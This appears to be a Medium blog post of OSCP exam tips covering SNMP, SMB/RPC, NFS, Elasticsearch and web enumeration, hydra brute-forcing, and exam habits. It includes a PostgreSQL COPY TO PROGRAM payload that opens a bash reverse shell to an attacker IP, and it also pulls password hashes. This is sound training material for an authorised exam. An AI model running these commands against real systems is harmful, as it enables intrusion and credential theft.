

](https://medium.com/plans?dimension=post_audio_button&postId=87768ccf770f&source=upgrade_membership---post_audio_button-----------------------------------------)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*dEzT_fbf-BibBb10Wj2exw.png)

Avoid OSCP rabbit holes

Hello everyone, and welcome to Part 4 of OSCP Exam Secrets: Avoiding Rabbit Holes and Staying on Track!

The response to the first three parts has been amazing — thank you so much for the shares, comments, and messages. Your support keeps me motivated to share these OSCP exam tips and tricks to avoid rabbit holes.

In the earlier parts, we covered the common exploit pitfalls (like SQLi, LFI, id_rsa, PrintSpoofer), and deeper enumeration/privilege escalation tricks. Now in Part 4, we shift to some smart checks that many people skip or overthink during the exam.

[**Free link to read**](https://medium.com/the-first-digit/oscp-exam-secrets-avoiding-rabbit-holes-and-staying-on-track-part-4-87768ccf770f?sk=3271855eb255a8f7a07f746af320173d)

These are the small, high payoff moves that can save you hours: things like targeting overlooked ports early, building tiny custom wordlists in minutes, or spotting misconfigs before you fall into long rabbit holes.

These are checks I learned after wasting hours on machines.

Now, whenever I see these ports open, I pause everything and test these first.

### 1. UDP 161 Open? Stop Everything and Do SNMP First

Most of the time say some ports are open in the machine. We keep on enumerating them but never get a foothold. During the exam, always run a default port UDP scan along with a TCP full port scan.

> Most people ignore UDP after TCP scan.

Big mistake.

Say UDP port 161 SNMP is open. Below are some commands to enumerate SNMP.

echo -e "public\nprivate\nmanager" > communities.txt  
onesixtyone -c communities.txt $ip

If you get a hit like `public`, don’t celebrate — dump it:

snmpwalk -c public -v1 $ip 1.3.6.1.2.1

On Windows machines especially, this leaks gold:

snmpwalk -c public -v1 $ip .1.3.6.1.4.1.77.1.2.25   # Users  
snmpwalk -c public -v1 $ip .1.3.6.1.4.1.77.1.2.3.1.1 # Processes

I’ve seen:

- usernames
- installed software paths
- even cleartext strings

All before touching web or SMB.

Here, is the Windows MIB for snmpwalk tool helpful during enumeration.

![](https://miro.medium.com/v2/resize:fit:282/1*DhrI5nKKRhxFe5Ef5gS5wQ.png)

> 🔥 For a structured Active Directory attack workflow (40+ tools + cheat  
> sheets + commands), I’ve put together a full OSCP AD Toolkit PDF.  
> Download it now. [https://ko-fi.com/s/e4f8d0f8c7](https://ko-fi.com/s/e4f8d0f8c7)

### 2. Before Brute Forcing Anything — Use Rockyou + Site Words

When SSH/FTP/Telnet is open, don’t blindly bruteforce.

Start smart.

Phase 1 — try rockyou on known user:

hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip ssh

Mostly, the password should be in the rockyou.txt list only. If that fails, don’t increase threads. Go to the website.

Pull words from the site itself:

curl http://$ip -s | tr '[:upper:]' '[:lower:]' | grep -oE '\b\w{6,}\b' | sort -u > words.txt  
head -n 200 words.txt > custom.txt

Now:

hydra -L users.txt -P custom.txt $ip ftp

OSCP passwords LOVE this pattern:

> _companyname + year, season, username variations_

For example, say this is a website hosted on port 80,443. We can also create a custom wordlist from the about us page.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*zUO3e7lLFpbU3Sb_-564Hw.png)

Executives and management page

There is a high chance, we may get a username from these users present in the website. Also, sometimes passwords can also be found.

For username generation in exams/labs, the formats that hit most often are:

- `first.last`
- `firstinitiallastname`
- `firstname`
- `lastname`
- `flastname`

karl.fitzgerald  
rebecca.saddlemire  
charles.kirk  
andrew.snell  
julia.towle

And their common variants (worth trying if needed):

kfitzgerald  
r saddlemire  -> rsaddlemire  
ckirk  
asnell  
jtowle

> _Also read: — OSCP 2025 advanced enumeration and privilege escalation_
> 
> [_https://medium.com/bugbountywriteup/beyond-the-shell-advanced-enumeration-and-privilege-escalation-for-oscp-part-3-7410d3812d02_](https://medium.com/bugbountywriteup/beyond-the-shell-advanced-enumeration-and-privilege-escalation-for-oscp-part-3-7410d3812d02)

### 3. PostgreSQL (5432) Open? Try Login Before Web Attacks

People see a web app and start hunting for SQLi.

Meanwhile, PostgreSQL is sitting open with:

- default creds
- blank password
- superuser access

If you get in, you often get OS command execution much faster than any web exploit.

psql -h $ip -U postgres -d template1

Try blank or `postgres`.

If in:

\l  
\du  
SELECT * FROM pg_shadow;

Many times, this leads to command execution faster than any web exploit.

For example:-

Ran nmap , got port 5347 postgresql port to be open.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*gR9xGjb1qmhDBrHHTprcbg.png)

Enumerated port 80 got nothing useful.

**Initial foothold**

Since postgresql was running on port 5437, so logged in to postgresql using default creds

> User: postgresql
> 
> Pass: postgresql
> 
> **psql -h 192.168.1.x -p 5437 -U postgres**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*1E7NAdjjI93uLcI9l2bkFA.png)

**Above steps are only for enumeration of postgresql, we took rce from the postgresql db we had.**

> COPY (SELECT ‘’) TO PROGRAM ‘bash -c “bash -i >& /dev/tcp/192.168.45.173/5437 0>&1”’;

The application only provides a reverse shell on ports that it already has open, so we used 5437 for the RCE.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*9VGpyVGRBg1CyEeZ1OzRGg.png)

Got rce on port 5437.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*CiVSMdGSxjs__Os9z8LSwg.png)

### 4. SMB Open? Do RID Cycling Before enum4linux

One mistake I used to make was this:

> _See ports 139/445 → run_ `_enum4linux_` _→ scroll for 10 minutes → still confused._

Now I do something much faster and more targeted.

First, try a null session with RPC client:

rpcclient -U "" -N $ip

This is a built-in Windows RPC interaction tool that works beautifully for enumeration.

Once connected, run these immediately:

> serverinfo  
> lsaenumsid  
> netshareenumall

- `serverinfo` → OS and domain details
- `lsaenumsid` → RID cycling → real domain usernames
- `netshareenumall` → list available shares

You get **actual valid usernames** in seconds — not guesses.

You can also do it in one shot:

rpcclient -U "" -N $ip -c "enumdomusers"

Now, before touching any brute force, list shares:

smbclient -L //$ip -N

If guest/null access is allowed, enumerate those shares immediately.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*5DMDF4kpG2ZVj_DKFYYStA.png)

Guest user login via smbclient

### 5. Run Exiftool on files/documents found in the machine

If we come across files/documents hosted in the web application or in ftp or some service. Firstly, download it your attacker machine. Run exiftool on it to extract metadata from it. There are high chances that usernames or some hints may be present in such documents.

> exiftool -a -u (file)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*EIBZMr-AHX81zpiS7ogacg.png)

Here, in above example, we got the author’s name to be Got Root? This can be used as potential username in further attacks.

> 🔥 For a structured Linux enumeration checklist (commands + one-liners), I’ve put together a 4-page OSCP-focused cheat sheet. Download it now. [https://ko-fi.com/s/1051de1f06](https://ko-fi.com/s/1051de1f06)

### 6. NFS (2049) Open? Check no_root_squash Immediately

Before doing local enum, check this:

showmount -e $ip  
mount -t nfs $ip:/home /mnt -o nolock  
touch /mnt/test && chmod 777 /mnt/test

If writable, you may be able to drop files as root.

This is a classic OSCP misconfiguration.

### 7. Elasticsearch (9200) Open? Curl It

People ignore this port.

Many times:

- indices are open
- credentials/hashes stored in documents
- full data leakage without authentication

curl http://$ip:9200/_cat/indices?v  
curl http://$ip:9200/_search?q=password

Unauth clusters leak credentials straight from documents.

### 8. Web server open? Check for obvious leaks before running big wordlists

One mistake many people make is seeing a web server and immediately starting `gobuster` or `dirsearch` with huge wordlists for 30–40 minutes.

In OSCP-style machines, important files are often sitting in plain sight because directory listing or sloppy backups are enabled.

First, just look at the page source quickly:

curl -s http://$ip/ | grep -Ei "bak|old|conf|sql|zip|~"

You’ll often find files like:

- `config.bak`
- `backup.zip`
- `db.sql`
- `settings.old`

Download them and inspect:

wget http://$ip/config.bak

Many times, credentials are sitting inside these files. No brute force, no exploits needed.

Also check directly for Apache auth files before hunting for vulnerabilities:

curl http://$ip/.htaccess  
gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x bak,old,conf,htpasswd

If you find a `.htpasswd` file, crack it offline with John.

> _Want the Full Ligolo-ng Cheat Sheet (with Screenshots)?_
> 
> _This blog is the short version I used for quick notes._
> 
> _I’ve put together a_ **_fully illustrated Ligolo-ng cheat sheet (PDF)_** _with:  
> ✔ all commands  
> ✔ routing examples  
> ✔ listener chaining  
> ✔ screenshots from my own lab setup  
> ✔ reverse shell workflow_
> 
> _👉_ **_Download it here now:_**[_https://ko-fi.com/s/fb1f4b07c7_](https://ko-fi.com/s/fb1f4b07c7)

### 9. Schedule Mandatory 10–15 Minute Breaks (On Purpose)

One of the biggest OSCP traps is not technical — it’s mental.

You hit a wall during privilege escalation or exploitation, and instead of stepping away, you go deeper. You start trying random things, re-running tools, Googling versions, and slowly sliding into a rabbit hole without realizing it.

During the exam I knew I will get rabbit holes. I solved AD and 1st standalone in around 5 hours. So, I required more 10 points to pass. For these 10 points it took me 7 hours of time. 7 hours of doing random things and no hints found as to where to go.

But what helped me a lot was planning breaks deliberately, not when I felt tired.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*HLOUFWho4Z1jR82C5IMVcQ.png)

For example:

- After 3 failed privilege escalation attempts
- After 30 minutes stuck on the same idea
- After completing one machine

I would literally get up, tell the proctor I’m going on a break. Go in another room and walk or talk to family. The break used to span from 10–30 minutes.

When you come back, you don’t “continue” — you re-read your notes from the top.

Very often, the mistake becomes obvious:

> _“Why didn’t I check that service?”  
> “I completely ignored that port.”  
> “I never checked permissions properly.”_

Those breaks reset your thinking and prevent hours of blind digging.

### 10. Report as You Go (The Smart Way)

Most people think reporting is something to worry about at the end.

That’s a mistake.

Reporting as you go has two huge advantages:

1. It prevents end-of-exam panic

You’re not trying to remember 20 hours of steps at 4 AM.

2. It exposes rabbit holes in real time

Here’s what I did:

- Screenshot important steps immediately
- Add a small caption like:  
    _“Tried SUID path — no result”_  
    _“Checked cron jobs — nothing interesting”_
- Add timestamps

When you scroll back through your notes, you start seeing patterns like:

> _“I spent 1.5 hours here doing nothing useful._

That awareness helps you stop repeating the same behavior on the next machine.

It’s like having a mirror for your own thinking.

### 11. The Final 2–3 Hours: Do a “Victory Lap” Checklist

Post the 12 hours I had got 70 marks to pass. Then I slept for around 4-5 hours. I still had say 7 hours left. Woke up and tried, within the next 2 hours I had got the next 30 points as well. Means I got total 100 points. How? I told earlier as well. Taking breaks and being easy on yourself is the key.

In the end I did a systematic pass:

- Did I capture all flags properly?
- Did I put all the flags found in the exam machine portal?
- Did I take proof screenshots clearly?
- Did I actually root all required machines?
- Did I miss obvious enumeration on any open ports?
- Did I skip quick checks on services I ignored earlier?

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*f7y0AH3z4So2t-dAa22_Zw.png)

You’d be surprised how often:

- A forgotten HTTP port
- An untested service
- A missed low-hanging misconfiguration

can still give points in the last hour.

This “victory lap” isn’t about hacking — it’s about making sure you don’t lose marks due to tiredness.

## Conclusion — Think Clearly, Not Quickly

We talked about something more important for OSCP success: how to think when you’re stuck.

Rabbit holes don’t happen because you don’t know enough.  
They happen because you keep searching in the wrong place for too long.

Simple habits like taking planned breaks, documenting as you go and being easy on yourself can save you more time than any script or tool ever will.

Remember, the OSCP exam rewards clear thinking, structured actions, and good time decisions — not how many commands you can run.

> **_📘 Want the OSCP Pocket Cheat Sheet (Printable PDF)?_**_It includes all my favorite commands, privilege-escalation notes, and AD enumeration tips in one page.  
> 🔥Download it here now→_ [_https://ko-fi.com/s/dbe387ad1a_](https://ko-fi.com/s/dbe387ad1a)_🔥_

If this series has helped you during your OSCP prep, feel free to:

- Leave a clap 👏👏and share your thoughts in the comments
- Share this with someone preparing for OSCP

Thanks for reading!

More practical OSCP content coming soon.